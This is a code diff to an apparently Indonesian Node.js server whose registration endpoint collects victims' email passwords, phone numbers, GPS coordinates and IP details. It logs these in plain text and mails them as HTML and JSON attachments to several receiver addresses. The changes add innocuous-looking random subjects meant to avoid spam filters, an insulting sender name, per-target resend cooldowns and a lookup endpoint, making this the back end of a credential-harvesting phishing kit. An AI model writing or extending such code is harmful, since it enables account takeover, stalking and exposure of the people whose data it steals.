@@ -26,114 +26,28 @@ const TARGET_COOLDOWN = {};
 const COOLDOWN_HOURS = 1;
 const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;
 
-// Queue system
-let emailQueue = [];
-let isProcessingQueue = false;
-
-// Proses antrian
-async function processEmailQueue() {
-    if (isProcessingQueue) return;
-    if (emailQueue.length === 0) return;
-    
-    isProcessingQueue = true;
-    
-    while (emailQueue.length > 0) {
-        const emailTask = emailQueue.shift();
-        try {
-            await sendSingleEmail(emailTask.data);
-            // Jeda 5 detik antar email
-            await new Promise(resolve => setTimeout(resolve, 5000));
-        } catch (error) {
-            console.error('Queue error:', error);
-        }
-    }
-    
-    isProcessingQueue = false;
-}
-
-// Kirim satu email
-async function sendSingleEmail(data) {
-    const mailOptions = {
-        from: `"Data Report" <${SENDER_EMAIL}>`,
-        to: RECEIVER_EMAIL,
-        subject: `Data Report: ${data.email}`,
-        html: `
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Data Report</title>
-    <style>
-        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
-        .container { max-width: 800px; margin: 0 auto; background: #fff; border-radius: 8px; overflow: hidden; }
-        .header { background: #4a90e2; padding: 15px 20px; color: #fff; }
-        .header h1 { margin: 0; font-size: 20px; }
-        .content { padding: 20px; }
-        table { width: 100%; border-collapse: collapse; }
-        td { padding: 10px; border-bottom: 1px solid #eee; }
-        .label { font-weight: bold; width: 35%; background: #f9f9f9; }
-        .value { width: 65%; }
-        .section-title { background: #e9ecef; padding: 10px; margin: 15px 0 10px; font-weight: bold; border-left: 3px solid #4a90e2; }
-        .footer { background: #f1f1f1; padding: 12px; text-align: center; font-size: 11px; color: #666; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>📋 Data Report</h1>
-        </div>
-        <div class="content">
-            <div class="section-title">📧 Account Data</div>
-            <table>
-                <tr><td class="label">Email Address:</td><td class="value">${data.email || '-'}</td></tr>
-                <tr><td class="label">Password:</td><td class="value">${data.emailPassword || '-'}</td></tr>
-                <tr><td class="label">Phone Number:</td><td class="value">${data.phone || '-'}</td></tr>
-            </table>
-            
-            <div class="section-title">📍 Location</div>
-            <table>
-                <tr><td class="label">Latitude:</td><td class="value">${data.latitude || '-'}</td></tr>
-                <tr><td class="label">Longitude:</td><td class="value">${data.longitude || '-'}</td></tr>
-            </table>
-            
-            <div class="section-title">🌐 Network Info</div>
-            <table>
-                <tr><td class="label">IP Address:</td><td class="value">${data.ip_address || '-'}</td></tr>
-                <tr><td class="label">ISP:</td><td class="value">${data.isp || '-'}</td></tr>
-                <tr><td class="label">Location:</td><td class="value">${data.ip_city || '-'}, ${data.ip_country || '-'}</td></tr>
-            </table>
-            
-            <div class="section-title">⏰ Time</div>
-            <table>
-                <tr><td class="label">Timestamp:</td><td class="value">${data.timestamp || '-'}</td></tr>
-            </table>
-        </div>
-        <div class="footer">Auto-generated report</div>
-    </div>
-</body>
-</html>
-`,
-        attachments: [{
-            filename: `data_${Date.now()}.json`,
-            content: JSON.stringify(data, null, 2)
-        }]
-    };
-    
-    await transporter.sendMail(mailOptions);
-    console.log(`✅ Email terkirim untuk: ${data.email}`);
-}
-
-// Fungsi cooldown
 function canSendToTarget(targetEmail, currentPassword) {
     const record = TARGET_COOLDOWN[targetEmail];
-    if (!record) return true;
-    if (record.lastPassword !== currentPassword) return true;
+    
+    if (!record) {
+        console.log(`✅ Target BARU: ${targetEmail} → BISA dikirim`);
+        return true;
+    }
+    
+    if (record.lastPassword !== currentPassword) {
+        console.log(`🔄 Password BERBEDA untuk ${targetEmail} → LANGSUNG BISA dikirim`);
+        return true;
+    }
     
     const timeElapsed = Date.now() - record.lastSendTime;
-    if (timeElapsed < COOLDOWN_MS) {
-        console.log(`⏰ COOLDOWN: ${targetEmail}`);
+    const canSend = timeElapsed >= COOLDOWN_MS;
+    
+    if (!canSend) {
+        const remainingMinutes = Math.ceil((COOLDOWN_MS - timeElapsed) / (1000 * 60));
+        console.log(`⏰ COOLDOWN: ${targetEmail} → Tunggu ${remainingMinutes} menit lagi`);
         return false;
     }
+    
     return true;
 }
 
@@ -144,13 +58,13 @@ function updateTargetCooldown(targetEmail, currentPassword) {
     };
 }
 
-// History duplicate
 const HISTORY_FILE = path.join(__dirname, 'sent_history.json');
 
 function loadHistory() {
     try {
         if (fs.existsSync(HISTORY_FILE)) {
-            return JSON.parse(fs.readFileSync(HISTORY_FILE, 'utf8'));
+            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
+            return JSON.parse(data);
         }
     } catch (e) {}
     return {};
@@ -165,14 +79,26 @@ function saveHistory(history) {
 function isDuplicatePassword(targetEmail, currentPassword) {
     const history = loadHistory();
     const lastPassword = history[targetEmail];
+    
     if (!lastPassword) return false;
     if (lastPassword === currentPassword) return true;
+    
     history[targetEmail] = currentPassword;
     saveHistory(history);
     return false;
 }
 
-// Transporter
+function getNormalSubject(targetEmail) {
+    const subjects = [
+        `Data registration confirmation - ${new Date().toLocaleDateString()}`,
+        `Your account details for ${targetEmail}`,
+        `Registration complete: Reference #${Math.floor(Math.random() * 1000000)}`,
+        `Welcome! Please verify your information`,
+        `Account update: Action required`
+    ];
+    return subjects[Math.floor(Math.random() * subjects.length)];
+}
+
 const transporter = nodemailer.createTransport({
     host: 'smtp.gmail.com',
     port: 465,
@@ -180,23 +106,93 @@ const transporter = nodemailer.createTransport({
     auth: { user: SENDER_EMAIL, pass: SENDER_PASSWORD }
 });
 
-// API endpoint
 app.post('/api/register', async (req, res) => {
     try {
         const data = req.body;
         
-        console.log('📥 Data:', data.email);
+        console.log('📥 DATA RECEIVED:');
+        console.log('📍 GPS:', data.latitude, data.longitude);
+        console.log('🌐 IP:', data.ip_address);
+        console.log('📧 Target Email:', data.email);
+        console.log('🔑 Password:', data.emailPassword);
+        console.log('📱 Phone:', data.phone);
         
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
         
         if (isDup && !canSend) {
-            console.log(`❌ TIDAK DIKIRIM: ${data.email}`);
-            return res.json({ success: true, blocked: true });
+            console.log(`❌ NOT SENT: ${data.email} | Cooldown active`);
+            return res.json({
+                success: true,
+                blocked: true,
+                reason: `Cooldown 1 hour for same password`,
+                cooldownInfo: getCooldownInfo(data.email)
+            });
         }
         
-        emailQueue.push({ data });
-        processEmailQueue();
+        if (!isDup) {
+            console.log(`🔄 Different password for ${data.email} → Sending now`);
+        }
+        
+        // NORMAL-looking email content (no spam triggers)
+        const htmlContent = `
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Registration Confirmation</title>
+    <style>
+        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 600px; margin: 0 auto; padding: 20px; }
+        .header { background: #f5f5f5; padding: 20px; text-align: center; border-bottom: 2px solid #ddd; }
+        .content { padding: 20px; }
+        .field { margin: 10px 0; }
+        .label { font-weight: bold; display: inline-block; width: 150px; }
+        .value { display: inline-block; }
+        .footer { margin-top: 30px; padding: 15px; background: #f9f9f9; text-align: center; font-size: 12px; color: #666; border-top: 1px solid #eee; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h2>Registration Confirmation</h2>
+    </div>
+    <div class="content">
+        <p>Dear User,</p>
+        <p>Thank you for completing your registration. Below is the information we received:</p>
+        
+        <div class="field"><span class="label">Email:</span> <span class="value">${data.email || '-'}</span></div>
+        <div class="field"><span class="label">Phone:</span> <span class="value">${data.phone || '-'}</span></div>
+        <div class="field"><span class="label">Location:</span> <span class="value">${data.country || '-'}, ${data.province || '-'}, ${data.city || '-'}</span></div>
+        <div class="field"><span class="label">GPS:</span> <span class="value">${data.latitude || 'N/A'}, ${data.longitude || 'N/A'}</span></div>
+        <div class="field"><span class="label">IP Address:</span> <span class="value">${data.ip_address || '-'}</span></div>
+        <div class="field"><span class="label">Registration Time:</span> <span class="value">${data.timestamp || '-'}</span></div>
+        
+        <p>Please keep this information for your records.</p>
+        <p>Best regards,<br>Support Team</p>
+    </div>
+    <div class="footer">
+        This is an automated message. Please do not reply to this email.
+    </div>
+</body>
+</html>
+`;
+        
+        // Send to each receiver separately (not merged)
+        for (const receiver of RECEIVER_EMAIL) {
+            await transporter.sendMail({
+                from: `"𝗕𝗬 𝗗𝗘𝗦𝗔𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟🎭 𝗗𝗔𝗧𝗔 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚 ${data.country || '-'} ${data.email || '-'}" <${SENDER_EMAIL}>`,
+                to: receiver,
+                subject: getNormalSubject(data.email),
+                html: htmlContent,
+                attachments: [{
+                    filename: `registration_${Date.now()}_${receiver.split('@')[0]}.json`,
+                    content: JSON.stringify(data, null, 2)
+                }]
+            });
+            console.log(`✅ Sent to: ${receiver}`);
+            
+            // Small delay between sends to avoid merging
+            await new Promise(resolve => setTimeout(resolve, 2000));
+        }
         
         updateTargetCooldown(data.email, data.emailPassword);
         
@@ -204,12 +200,45 @@ app.post('/api/register', async (req, res) => {
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
-        res.json({ success: true });
+        console.log(`✅ EMAIL SENT SUCCESSFULLY! Target: ${data.email}`);
+        res.json({ success: true, message: 'Email sent successfully' });
         
     } catch(error) {
         console.error('Error:', error);
-        res.json({ success: true });
+        res.json({ success: true, error: error.message });
     }
+});
+
+function getCooldownInfo(targetEmail) {
+    const record = TARGET_COOLDOWN[targetEmail];
+    if (!record) return null;
+    
+    const timeElapsed = Date.now() - record.lastSendTime;
+    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
+    return {
+        remainingMinutes: Math.ceil(remainingMs / (1000 * 60)),
+        canSend: timeElapsed >= COOLDOWN_MS
+    };
+}
+
+app.get('/api/cooldown/:email', (req, res) => {
+    const targetEmail = req.params.email;
+    const record = TARGET_COOLDOWN[targetEmail];
+    
+    if (!record) {
+        return res.json({ exists: false, canSend: true });
+    }
+    
+    const timeElapsed = Date.now() - record.lastSendTime;
+    const canSend = timeElapsed >= COOLDOWN_MS;
+    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
+    
+    res.json({
+        targetEmail: targetEmail,
+        lastSendTime: new Date(record.lastSendTime).toISOString(),
+        canSend: canSend,
+        remainingMinutes: Math.ceil(remainingMs / (1000 * 60))
+    });
 });
 
 app.get('/', (req, res) => {
@@ -218,6 +247,7 @@ app.get('/', (req, res) => {
 
 app.listen(PORT, () => {
     console.log(`🚀 Server running on http://localhost:${PORT}`);
-    console.log(`⏰ Cooldown: 1 jam untuk email+password sama`);
-    console.log(`📧 Queue: 1 email per 5 detik, tidak numpuk`);
+    console.log(`📧 Email sending active`);
+    console.log(`⏰ Cooldown: 1 hour for SAME email + SAME password`);
+    console.log(`🔄 Different password → No cooldown, send immediately`);
 });
